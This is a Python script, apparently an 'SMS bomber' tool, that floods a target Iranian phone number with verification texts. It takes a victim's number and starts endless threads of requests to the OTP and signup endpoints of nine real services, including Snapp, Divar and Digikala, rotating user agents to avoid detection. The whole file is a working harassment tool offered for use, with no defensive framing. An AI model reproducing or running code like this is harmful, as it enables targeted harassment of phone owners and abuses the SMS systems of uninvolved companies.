#in the name of God
#Coded By Sardar Cybery
#A D O R TM
import os
import sys
import time
from colorama import Fore as Coloresh
import requests
from threading import Thread
import random
#User Agent
User = ["Mozilla/5.0 (Linux; Android 7.1.0; A30 Build/MNB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (Linux; Android 5.1.0; A6 Build/MNB19M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4464.104 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"]
#All API 
#Api Snap
def Snap(Number):
    SnapH= {"user-agent":random.choice(User)}
    SnapC = {"cellphone":"+98"+Number}
    try:
        time.sleep(2)
        SnapS = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",headers=SnapH,json=SnapC)
        if Snap.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Divar
def Divar(Number):
    DivarH = {"user-agent":random.choice(User)}
    DivarC = {"phone":Number}
    try:
        time.sleep(2)
        DivarS = requests.post("https://api.divar.ir/v5/auth/authenticate",headers=DivarH,json=DivarC)
        if DivarS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api AliBaBa
def AliBaBa(Number):
    AliBaBaH = {"user-agent":random.choice(User)}
    AliBaBaC = {"phoneNumber":Number}
    try:
        time.sleep(2)
        AliBaBaS = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",headers=AliBaBaH,json=AliBaBaC)
        if AliBaBaS.ok == True:
            print(Coloresh.GREEN+"Send Sms :)")
        else:
            print(Coloresh.RED+"No Send :( ")
    except:
        print(Coloresh.RED+"No Send :( ")
#Api Digi Kala
def DigiKala(Number):
    DigiKalaH = {"user-agent":random.choice(User)}
    DigiKalaC = {"username":"0"+Number}
    try:
        time.sleep(2)
        DigiKalaS = requests.post("https://api.digikala.com/v1/user/authenticate/",headers=DigiKalaH,json=DigiKalaC)
        if DigiKalaS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Api DiGiKalaJet
def DigiKalaJet(Number):
    DiGiKalaJetH = {"user-agent":random.choice(User)}
    DiGiKalaJetC = {"phone":"0"+Number}
    try:
        time.sleep(2)
        DiGiKalaJetS = requests.post("https://api.digikalajet.ir/user/login-register/",headers=DiGiKalaJetH,json=DiGiKalaJetC)
        if DiGiKalaJetS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Api Delino
def Delino(Number):
    DelinoH = {"user-agent":random.choice(User)}
    DelinoC = {"mobile":"0"+Number}
    try:
        time.sleep(2)
        DelinoS = requests.post("https://www.delino.com/user/register",headers=DelinoH,json=DelinoC)
        if DelinoS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Api Taghche
def Taghche(Number):
    TaghcheH = {"user-agent":random.choice(User)}
    TaghcheC = {"contact":"0"+Number}
    try:
        time.sleep(2)
        TaghcheS = requests.post("https://gw.taaghche.com/v4/site/auth/signup",headers=TaghcheH,json=TaghcheC)
        if TaghcheS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Api Helsa
def Helsa(Number):
    HelsaH = {"user-agent":random.choice(User)}
    HelsaC = {"mobileNumber":"0"+Number}
    HelsaN = ("0"+Number)
    try:
        time.sleep(2)
        HelsaS = requests.post(f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={HelsaN}&deviceId=25010064645373610205{str(random.randint(10,99))}5635373610201245305768136624&discountCode=&utm_content=&utm_source=&utm_campain=",headers=HelsaH,json=HelsaC)
        if HelsaS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Api Pezeshket
def Pezeshket(Number):
    PezeshketH = {"user-agent":random.choice(User)}
    PezeshketC = {"mobileNumber":Number}
    try:
        PezeshketS = requests.post("https://api.pezeshket.com/core/v1/auth/requestCode",headers=PezeshketH,json=PezeshketC)
        if PezeshketS.ok == True:
            print(Coloresh.GREEN+"Send :)")
        else:
            print(Coloresh.RED+"Error :( ")
    except:
        print(Coloresh.RED+"Error :( ")
#Panel
def Panel():
    os.system("clear")
    time.sleep(1)
    print(Coloresh.GREEN + '''
    
    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||''' + Coloresh.RED + '''
                      w''' + Coloresh.WHITE + '''
    ||||||||||||''' + Coloresh.RED + "  //  |  \\\ " + Coloresh.WHITE + " |||||||||||||\n    ||||||||||||" + Coloresh.RED + " ||   |   || " + Coloresh.WHITE + "|||||||||||||\n    ||||||||||||" + Coloresh.RED + "  \\\  |  //  " + Coloresh.WHITE + "|||||||||||||" + Coloresh.RED + '''
    
    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||\n    ||||||||||||||||||||||||||||||||||||||
                
             ''' + Coloresh.CYAN + "Coded " + Coloresh.LIGHTMAGENTA_EX + "By " + Coloresh.YELLOW + '''Sardar Cyberym :) ''' + Coloresh.BLUE + '''
    


             1) Start Bomber
             2) Exit
    ''')
    Panel_Text = str(input("(1 / 2) ===>> "))
    while True:
        if Panel_Text == "1":
            SmsBomber()
            break
        if Panel_Text == "2":
            os.system("clear")
            time.sleep(1)
            print(Coloresh.RED + "GodBye Bro :')")
            exit()
        else:
            Panel_Text = str(input(Coloresh.GREEN + "Error\n(1 / 2) ===>> "))
#Smsbomber
def SmsBomber():
    global Number
    os.system("clear")
    time.sleep(1)
    print(Coloresh.CYAN + '''
    
    
                    /\         |||||||         ||||||       |||||||
                   /  \        |      |       |      |      |      |
                  /    \       |       |     |        |     |||||||
                 /______\      |       |     |        |     ||    ||
                /        \     |      |       |      |      ||     ||
               /          \    |||||||         ||||||       ||      ||

                                         A D O R TM
                                     Coded By Sardar Cybery
    ''') 
    Number = str(input("Target (Example : 9123456789) ===>> "))
    while True:
        if len(Number) == 10:
            while True:
                try:
                    Number = int(Number)
                    Number = str(Number)
                    break
                except:
                    os.system("clear")
                    time.sleep(1)
                    Number = str(input(Coloresh.RED + "Error\n Target (Example : 9123456789) ===>> "))
            os.system("clear")
            Attack()
            break
        else:
            os.system("clear")
            time.sleep(1)
            Number = str(input(Coloresh.RED + "Error\nTarget (Example : 9123456789) ===>> "))
#Attack
def Attack():   
    time.sleep(1)
    Thread(target=Snap, args=[Number]).start()
    Thread(target=Divar, args=[Number]).start()
    Thread(target=Delino, args=[Number]).start()
    Thread(target=DigiKala, args=[Number]).start()
    Thread(target=DigiKalaJet, args=[Number]).start()
    Thread(target=AliBaBa, args=[Number]).start()
    Thread(target=Pezeshket, args=[Number]).start()
    Thread(target=Helsa, args=[Number]).start()
    Thread(target=Taghche, args=[Number]).start()
    Attack()
#Run
Panel()

#A D O R TM
